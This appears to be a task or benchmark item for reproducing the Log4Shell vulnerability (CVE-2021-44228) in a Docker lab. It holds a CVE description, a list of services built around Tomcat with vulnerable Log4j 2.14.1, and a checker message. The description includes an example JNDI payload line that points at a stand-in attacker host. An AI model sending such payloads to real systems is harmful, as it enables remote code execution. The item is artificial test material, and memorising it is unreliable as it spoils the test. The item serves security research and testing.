CVE description: CVE‑2021‑44228, commonly called Log4Shell, is a critical vulnerability in the Apache Log4j 2 Java logging library. The flaw resides in Log4j’s message lookup mechanism which processes `${jndi:…}` patterns. When an attacker can influence data that is logged – for example HTTP headers, URL parameters, or form fields – and that data contains a malicious `${jndi:ldap://attacker.com/a}` string, Log4j performs a Java Naming and Directory Interface (JNDI) lookup. The JNDI lookup can resolve to an LDAP or RMI server under the attacker’s control, causing the vulnerable host to download and instantiate arbitrary Java classes. The downloaded code is executed with the privileges of the Java process, giving the attacker full remote code execution on the affected system. The vulnerability is present in all Log4j 2 core versions from 2.0‑beta9 up to and including 2.15.0. Exploitation requires no authentication, no prior access, and can be carried out over the network simply by sending a crafted request to any service that logs attacker‑supplied data. Successful exploitation allows the attacker to install back‑doors, steal credentials, run ransomware, deploy cryptominers, or otherwise compromise the confidentiality, integrity, and availability of the host.
Attack Type: remote code execution
Services (format: [SERVICE-DEPENDENCY-TYPE][SERVICE-NAME][SERVICE-VERSIONS] SERVICE-DESCRIPTION):
- [HARD][tomcat][['9.0']] Apache Tomcat provides a Java servlet container. The deployed web application includes the Log4j 2 core library version 2.14.1 (a vulnerable version). Tomcat is the essential service that runs the vulnerable Java code and therefore makes the Docker system exploitable.
- [SOFT-BASE][openjdk][['8-jre']] Java runtime environment required to execute the Tomcat server and the Log4j library.
- [SOFT-WEB][nginx][['1.21']] Optional reverse‑proxy that forwards HTTP requests to Tomcat. It is not required for the vulnerability itself but provides a typical web‑server layer in a Docker composition.
Expected 'HARD' dependencies service not proposed!
